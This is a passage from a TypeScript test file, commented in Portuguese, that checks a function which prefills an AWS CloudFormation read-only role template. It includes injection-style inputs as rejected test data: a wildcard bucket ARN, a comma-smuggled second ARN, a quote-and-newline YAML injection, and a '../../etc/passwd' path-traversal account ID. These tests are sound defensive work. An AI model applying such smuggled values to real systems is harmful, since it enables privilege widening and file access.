    ['bucket com maiúscula', { buckets: ['Trilha-111122223333'] }, 'buckets'],
    ['bucket com curinga', { buckets: ['*'] }, 'buckets'],
    ['bucket com o ARN de tudo', { buckets: ['trilha-ok', 'arn:aws:s3:::*'] }, 'buckets'],
    ['bucket com vírgula e outro ARN', { buckets: ['trilha-ok,arn:aws:s3:::outro'] }, 'buckets'],
    ['bucket com aspas e quebra de linha', { buckets: ["trilha'\n  Outro:"] }, 'buckets'],
  ])('recusa %s, sem devolver nada pela metade nem repetir o valor', (_name, change, problem) => {
    let error: unknown;
    try {
      prefillReaderTemplate(template, { ...values, ...change });
    } catch (caught) {
      error = caught;
    }
    expect(error).toBeInstanceOf(AwsReaderPrefillError);
    expect((error as AwsReaderPrefillError).problem).toBe(problem);
    // A mensagem leva só o código do problema, nunca o texto recebido.
    expect((error as AwsReaderPrefillError).message).toBe(
      `O template do papel de leitura não pôde ser preenchido (${problem}).`,
    );
  });

  it('recusa um texto que não é o template do papel de leitura', () => {
    const cases: Record<string, string> = {
      vazio: '',
      'uma página de erro': '<!doctype html><title>404</title>',
      'outro template': "Parameters:\n  Outro:\n    Type: String\n    Default: 'x'\n",
      'sem um dos parâmetros': template.replace('  ReadTaggedLogGroups:\n', '  OutroNome:\n'),
      'um parâmetro repetido': template.replace('  ReadAwsServiceLogs:\n', '  Audience:\n'),
      'um parâmetro sem o tipo': template.replace(
        '  NodeEgressIps:\n    Type: String\n',
        '  NodeEgressIps:\n',
      ),
      'um padrão em várias linhas': template.replace(
        `    Default: ${AWS_READER_AUDIENCE}\n`,
        `    Default: >-\n      ${AWS_READER_AUDIENCE}\n`,
      ),
      'dois padrões no mesmo parâmetro': template.replace(
        `    Default: ${AWS_READER_AUDIENCE}\n`,
        `    Default: ${AWS_READER_AUDIENCE}\n    Default: https://outro.example/aws\n`,
      ),
      'os parâmetros dentro de outra seção': template.replace('\nParameters:\n', '\nMappings:\n'),
    };
    for (const [name, text] of Object.entries(cases)) {
      expect(
        problemOf(() => prefillReaderTemplate(text, values)),
        name,
      ).toBe('template');
    }
  });

  it('mantém o fim de linha do arquivo (um template servido com CRLF sai com CRLF)', () => {
    const windows = template.replaceAll('\n', '\r\n');
    const filled = prefillReaderTemplate(windows, values);
    expect(filled.replaceAll('\r\n', '\n')).toBe(prefillReaderTemplate(template, values));
    expect(
      filled.split('\n').every((line, index, lines) => index === lines.length - 1 || line.endsWith('\r')),
    ).toBe(true);
  });

  it('o arquivo preenchido cabe no TemplateBody do CloudFormation, e um que não coubesse é recusado', () => {
    const bytes = (text: string) => Buffer.byteLength(text, 'utf8');
    expect(bytes(template)).toBeLessThan(CLOUDFORMATION_TEMPLATE_BODY_MAX_BYTES);
    // O pior caso do cadastro: 4 IPs e três buckets com o nome mais longo que o S3 aceita.
    const longest = (index: number) => `${'b'.repeat(61)}-${index}`;
    const worst = prefillReaderTemplate(template, {
      ...values,
      egressIps: ['203.0.113.101/32', '203.0.113.102/32', '203.0.113.103/32', '203.0.113.104/32'],
      buckets: [longest(1), longest(2), longest(3)],
    });
    expect(bytes(worst)).toBeLessThan(CLOUDFORMATION_TEMPLATE_BODY_MAX_BYTES);
    // Com folga para o template crescer: se este número cair, é hora de enxugar os comentários do template.
    expect(CLOUDFORMATION_TEMPLATE_BODY_MAX_BYTES - bytes(worst)).toBeGreaterThan(2000);
    const padded = `${template}${'# comentário de enchimento, com acento\n'.repeat(200)}`;
    expect(problemOf(() => prefillReaderTemplate(padded, values))).toBe('too_large');
  });

  it('o nome do arquivo leva o ID da conta, e só um ID de 12 dígitos', () => {
    expect(awsReaderPrefilledFileName(ACCOUNT)).toBe('verax-control-reader-111122223333.yaml');
    for (const accountId of [
      '',
      '11112222333',
      '1111222233334',
      '11112222333a',
      '../../etc/passwd',
      '1111 2222 3333',
    ]) {
      expect(problemOf(() => awsReaderPrefilledFileName(accountId))).toBe('account');
    }
  });
});
